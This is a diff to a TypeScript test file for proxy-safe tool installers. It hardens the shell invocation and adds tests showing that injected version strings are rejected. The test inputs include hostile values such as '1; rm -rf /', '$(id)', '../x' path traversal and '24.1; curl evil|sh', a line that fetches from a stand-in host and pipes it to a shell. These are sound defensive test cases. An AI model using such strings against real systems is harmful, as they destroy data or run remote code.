@@ -2,10 +2,10 @@
  * @file Tests for the proxy-safe tool installers, using a recording `Run`.
  */
 import assert from "node:assert/strict";
-import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { test } from "node:test";
+import { after, test } from "node:test";
 import { INSTALLERS, installTools, nodeArch, pathLine } from "../src/installers.ts";
 
 /** One recorded process call. */
@@ -36,8 +36,17 @@ function recorder(): { calls: Call[]; run: (cmd: string, args: string[], opts?: 
  * @returns Its path.
  */
 function toolsDir(): string {
-  return mkdtempSync(join(tmpdir(), "installers-"));
+  const dir = mkdtempSync(join(tmpdir(), "installers-"));
+  created.push(dir);
+  return dir;
 }
+
+/** Temp directories to remove when the tests finish. */
+const created: string[] = [];
+
+after(() => {
+  for (const dir of created) rmSync(dir, { recursive: true, force: true });
+});
 
 const ARCH = process.arch === "arm64" ? "arm64" : "x64";
 
@@ -52,7 +61,10 @@ test("node installs from nodejs.org through bash", async () => {
   assert.deepEqual(calls[0]?.cmd, "bash");
   assert.deepEqual(calls[0]?.args, [
     "-c",
-    `curl -fsSL https://nodejs.org/dist/v24.14.1/node-v24.14.1-linux-${ARCH}.tar.xz | tar -xJ -C ${target} --strip-components=1`,
+    'set -o pipefail; curl -fsSL -- "$1" | tar -xJ -C "$2" --strip-components=1',
+    "_",
+    `https://nodejs.org/dist/v24.14.1/node-v24.14.1-linux-${ARCH}.tar.xz`,
+    target,
   ]);
 });
 
@@ -126,4 +138,29 @@ test("pathLine lists bin dirs in tool order with a literal $PATH", () => {
     'export PATH="/t/node-24.14.1/bin:/t/bun-1.4.2/node_modules/.bin:$PATH"',
   );
   assert.equal(pathLine({}, "/t"), "");
+});
+
+test("invalid versions fail without running anything or creating directories", async () => {
+  for (const versions of [{ node: "1; rm -rf /" }, { node: "24.1$(id)" }, { bun: "-g" }, { uv: "../x" }]) {
+    const dir = toolsDir();
+    const { calls, run } = recorder();
+    const results = await installTools(versions, dir, run, { PATH: "/usr/bin" });
+    const [tool, version] = Object.entries(versions)[0] ?? [];
+    assert.deepEqual(calls, []);
+    assert.equal(results.length, 1);
+    assert.equal(results[0]?.ok, false);
+    assert.equal(results[0]?.error, `invalid version for ${tool}: ${version}`);
+    assert.deepEqual(readdirSync(dir), []);
+    assert.equal(existsSync(join(dir, "..", "x")), false);
+  }
+});
+
+test("the layout refuses a bad version instead of building a path", () => {
+  assert.throws(() => INSTALLERS.uv.dir("/t", "../x"), /invalid version for uv/);
+  assert.throws(() => INSTALLERS.bun.binDir("/t", "-g"), /invalid version for bun/);
+});
+
+test("pathLine skips invalid versions", () => {
+  assert.equal(pathLine({ node: "24.1; curl evil|sh", bun: "1.4.2" }, "/t"), 'export PATH="/t/bun-1.4.2/node_modules/.bin:$PATH"');
+  assert.equal(pathLine({ node: "$(id)" }, "/t"), "");
 });
